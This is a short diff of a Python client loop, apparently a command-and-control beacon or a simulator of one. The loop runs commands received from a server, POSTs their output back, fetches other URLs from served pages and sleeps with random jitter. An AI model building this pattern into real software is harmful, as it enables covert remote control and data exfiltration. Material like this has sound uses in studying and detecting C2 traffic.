@@ -55,10 +55,10 @@ def start(stop_event):
             data = run(command[0], configs.get("allowed_commands"), stop_event)
             # send data through POST request
             if command != "kill":
-                res = http_request(server, target=choose_target(res.text, method="POST"), methods="POST", data=data)
+                res = http_request(server, target=choose_target(res.text, configs, method="POST"), methods="POST", data=str(data).encode('ascii'))
         else:
             # # Choose an url in response webpage and send one GET request
-            res = http_request(server, target=choose_target(res.text))
+            res = http_request(server, target=choose_target(res.text, configs))
         if not stop_event.is_set():
             rand  = random.choice(np.arange(start=3, stop=15, step=0.042))
             print(f'Sleeping for {rand:.2f} seconds.')
